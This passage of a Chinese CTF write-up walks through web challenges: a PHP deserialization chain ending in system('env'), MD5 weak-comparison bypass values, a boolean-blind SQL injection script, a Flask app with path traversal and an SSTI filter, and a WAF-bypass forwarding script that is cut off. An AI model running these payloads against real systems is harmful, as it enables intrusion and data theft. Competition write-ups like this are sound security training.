<span class="variable language_">$this</span>-&gt;QYQS-&gt;partner = <span class="string">&quot;summer&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;BOY♂ can`t sign GEEK&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;KiraKiraAyu)).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;K4per).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;boys堂堂正正&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>找两个数</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hgccx3</span><br><span class="line">md5(hgccx3) = 35d5cc463b35382b160ff5ba1c24ee86</span><br><span class="line">md5(md5(hgccx3)) = 0e742678484972759051041417502882</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">md5(s155964671a) = 0e342768416822451524974117254469</span><br></pre></td></tr></table></figure></div><p>弱比较能过，强比较不行</p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251105195431008.png"></p><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;再走一步...&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;_4ak5ra;</span><br><span class="line">        <span class="variable">$a</span>();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><p>使用数组来实现调用某个类中的某个方法</p><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">greet</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;flag = <span class="string">&quot;FLAG&#123;example_flag_value&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = [<span class="variable">$a</span>, <span class="string">&#x27;greet&#x27;</span>];</span><br><span class="line"><span class="variable">$f</span>();</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251105195241702.png"></p><p>payload</p><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">All_in_one</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$KiraKiraAyu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$K4per</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Sams</span>āra;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$komiko</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Fox</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$QYQS</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sleep3r</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ivory</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$L</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$_4ak5ra</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">summer</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对象a: 触发__destruct</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">All_in_one</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;KiraKiraAyu = <span class="string">&quot;hgccx3&quot;</span>;        <span class="comment">// MD5碰撞值1</span></span><br><span class="line"><span class="variable">$a</span>-&gt;K4per = <span class="string">&quot;s155964671a&quot;</span>;         <span class="comment">// MD5碰撞值2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 对象b: 触发__set</span></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">All_in_one</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;Fox = <span class="string">&quot;summer::find_myself&quot;</span>;   <span class="comment">// 返回&quot;summer&quot;</span></span><br><span class="line"><span class="variable">$b</span>-&gt;komiko = <span class="keyword">new</span> <span class="title class_">All_in_one</span>();     <span class="comment">// 触发__call</span></span><br><span class="line"><span class="variable">$b</span>-&gt;L = <span class="string">&quot;1e5&quot;</span>;                      <span class="comment">// 科学计数法，满足&lt;4且+1&gt;10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 对象c: 最终执行system</span></span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">All_in_one</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;Samsāra = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;ivory = <span class="string">&quot;env&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对象d: 触发__toString -&gt; __invoke</span></span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title class_">All_in_one</span>();</span><br><span class="line"><span class="variable">$d</span>-&gt;_4ak5ra = [<span class="variable">$c</span>, <span class="string">&quot;__invoke&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 连接利用链</span></span><br><span class="line"><span class="variable">$b</span>-&gt;sleep3r = <span class="variable">$d</span>;  <span class="comment">// __call的第二个参数，触发__toString</span></span><br><span class="line"><span class="variable">$a</span>-&gt;QYQS = <span class="variable">$b</span>;     <span class="comment">// __destruct设置partner时触发__set</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="web-one-last-image"><a href="#web-one-last-image" class="headerlink" title="web-one_last_image"></a>web-one_last_image</h3><p>文件上传</p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251105201851215.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251105201915947.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251105201949093.png"></p><h3 id="web-Sequal-No-Uta"><a href="#web-Sequal-No-Uta" class="headerlink" title="web-Sequal No Uta"></a>web-Sequal No Uta</h3><p>存在sql注入，过滤空格%09绕过</p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251105202202649.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251105202146644.png"></p><p>打布尔盲注，payload</p><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">base_url = <span class="string">&quot;http://019a53f5-d0fc-76cc-ac28-806865babac6.geek.ctfplus.cn/check.php&quot;</span></span><br><span class="line"></span><br><span class="line">charset = <span class="built_in">sorted</span>(string.ascii_letters + string.digits + <span class="string">&quot;._&#123;&#125;-,&quot;</span>)  <span class="comment"># 二分法需要有序</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">pos = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_payload</span>(<span class="params">base_url, payload</span>):</span><br><span class="line">    payload = payload.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;%0a&quot;</span>)</span><br><span class="line">    response = requests.get(base_url, params=payload)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;该用户存在且活跃&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    left, right = <span class="number">0</span>, <span class="built_in">len</span>(charset) - <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 二分查找当前位置的字符</span></span><br><span class="line">    <span class="keyword">while</span> left &lt; right:</span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line">        ch = charset[mid]</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 只需要检查是否大于mid字符</span></span><br><span class="line">        payload = <span class="string">f&quot;name=admin&#x27; AND substr((SELECT group_concat(secret, &#x27;,&#x27;) FROM users),<span class="subst">&#123;pos&#125;</span>,1)&gt;&#x27;<span class="subst">&#123;ch&#125;</span>&#x27;-- &quot;</span></span><br><span class="line">        <span class="keyword">if</span> test_payload(base_url, payload):</span><br><span class="line">            left = mid + <span class="number">1</span>  <span class="comment"># 目标字符在右半部分</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = mid  <span class="comment"># 目标字符在左半部分（包括mid）</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># left == right 时找到目标字符</span></span><br><span class="line">    <span class="keyword">if</span> left &lt; <span class="built_in">len</span>(charset):</span><br><span class="line">        result += charset[left]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] 当前爆破结果: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">        pos += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] 爆破结束&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] 枚举完成:&quot;</span>, result)</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251105202832235.png"></p><h3 id="web-ez-read"><a href="#web-ez-read" class="headerlink" title="web-ez_read"></a>web-ez_read</h3><p>先随便注册一个账号</p><p>发现任意文件读取</p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251105203123395.png"></p><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, render_template_string, redirect, url_for, session</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__, template_folder=<span class="string">&quot;templates&quot;</span>, static_folder=<span class="string">&quot;static&quot;</span>)</span><br><span class="line">app.secret_key = <span class="string">&quot;key_ciallo_secret&quot;</span></span><br><span class="line"></span><br><span class="line">USERS = &#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">payload: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> payload:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(payload) <span class="keyword">not</span> <span class="keyword">in</span> (<span class="number">114</span>, <span class="number">514</span>):</span><br><span class="line">        <span class="keyword">return</span> payload.replace(<span class="string">&quot;(&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        waf = [<span class="string">&quot;__class__&quot;</span>, <span class="string">&quot;__base__&quot;</span>, <span class="string">&quot;__subclasses__&quot;</span>, <span class="string">&quot;__globals__&quot;</span>, <span class="string">&quot;import&quot;</span>,<span class="string">&quot;self&quot;</span>,<span class="string">&quot;session&quot;</span>,<span class="string">&quot;blueprints&quot;</span>,<span class="string">&quot;get_debug_flag&quot;</span>,<span class="string">&quot;json&quot;</span>,<span class="string">&quot;get_template_attribute&quot;</span>,<span class="string">&quot;render_template&quot;</span>,<span class="string">&quot;render_template_string&quot;</span>,<span class="string">&quot;abort&quot;</span>,<span class="string">&quot;redirect&quot;</span>,<span class="string">&quot;make_response&quot;</span>,<span class="string">&quot;Response&quot;</span>,<span class="string">&quot;stream_with_context&quot;</span>,<span class="string">&quot;flash&quot;</span>,<span class="string">&quot;escape&quot;</span>,<span class="string">&quot;Markup&quot;</span>,<span class="string">&quot;MarkupSafe&quot;</span>,<span class="string">&quot;tojson&quot;</span>,<span class="string">&quot;datetime&quot;</span>,<span class="string">&quot;cycler&quot;</span>,<span class="string">&quot;joiner&quot;</span>,<span class="string">&quot;namespace&quot;</span>,<span class="string">&quot;lipsum&quot;</span>]</span><br><span class="line">        <span class="keyword">for</span> w <span class="keyword">in</span> waf:</span><br><span class="line">            <span class="keyword">if</span> w <span class="keyword">in</span> payload:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">f&quot;waf&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    user = session.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, user=user)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/register&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = (request.form.get(<span class="string">&quot;username&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span>)</span><br><span class="line">        password = request.form.get(<span class="string">&quot;password&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;register.html&quot;</span>, error=<span class="string">&quot;用户名和密码不能为空&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> USERS:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;register.html&quot;</span>, error=<span class="string">&quot;用户名已存在&quot;</span>)</span><br><span class="line">        USERS[username] = &#123;<span class="string">&quot;password&quot;</span>: password&#125;</span><br><span class="line">        session[<span class="string">&quot;user&quot;</span>] = username</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;profile&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;register.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = (request.form.get(<span class="string">&quot;username&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span>).strip()</span><br><span class="line">        password = request.form.get(<span class="string">&quot;password&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        user = USERS.get(username)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> user <span class="keyword">or</span> user.get(<span class="string">&quot;password&quot;</span>) != password:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>, error=<span class="string">&quot;用户名或密码错误&quot;</span>)</span><br><span class="line">        session[<span class="string">&quot;user&quot;</span>] = username</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;profile&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/logout&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    session.clear()</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;index&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/profile&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">profile</span>():</span><br><span class="line">    user = session.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line">    name_raw = request.args.get(<span class="string">&quot;name&quot;</span>, user)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        filtered = waf(name_raw)</span><br><span class="line">        tmpl = <span class="string">f&quot;欢迎，<span class="subst">&#123;filtered&#125;</span>&quot;</span></span><br><span class="line">        rendered_snippet = render_template_string(tmpl)</span><br><span class="line">        error_msg = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        rendered_snippet = <span class="string">&quot;&quot;</span></span><br><span class="line">        error_msg = <span class="string">f&quot;渲染错误: <span class="subst">&#123;e&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(</span><br><span class="line">        <span class="string">&quot;profile.html&quot;</span>,</span><br><span class="line">        content=rendered_snippet,</span><br><span class="line">        name_input=name_raw,</span><br><span class="line">        user=user,</span><br><span class="line">        error_msg=error_msg,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/read&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_file</span>():</span><br><span class="line">    user = session.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line"></span><br><span class="line">    base_dir = os.path.join(os.path.dirname(__file__), <span class="string">&quot;story&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        entries = <span class="built_in">sorted</span>([f <span class="keyword">for</span> f <span class="keyword">in</span> os.listdir(base_dir) <span class="keyword">if</span> os.path.isfile(os.path.join(base_dir, f))])</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        entries = []</span><br><span class="line"></span><br><span class="line">    filename = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        filename = request.form.get(<span class="string">&quot;filename&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        filename = request.args.get(<span class="string">&quot;filename&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    content = <span class="literal">None</span></span><br><span class="line">    error = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> filename:</span><br><span class="line">        sanitized = filename.replace(<span class="string">&quot;../&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        target_path = os.path.join(base_dir, sanitized)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(target_path):</span><br><span class="line">            error = <span class="string">f&quot;文件不存在: <span class="subst">&#123;sanitized&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(target_path, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                content = f.read()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;read.html&quot;</span>, files=entries, content=content, filename=filename, error=error, user=user)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8080</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure></div><p>已经拿到了waf，写一个转发脚本</p><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, Response</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">TARGET_BASE = <span class="string">&quot;http://019a3f40-aa02-7642-88c4-a0afe07407cf.geek.ctfplus.cn/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">forward</span>():</span><br><span class="line">    name = request.args.get(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> name:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;请提供name参数&quot;</span>, <span class="number">400</span></span><br><span class="line">    password = <span class="string">&quot;1&quot;</span></span><br><span class="line">    reg_name = name + <span class="string">&#x27;a&#x27;</span> * (<span class="number">114</span> - <span class="built_in">len</span>(name))  <span class="comment"># 填充到114长度以绕过waf</span></span><br><span class="line">    s = requests.Session()</span><br><span class="line">    s.post(<span class="string">f&quot;<span 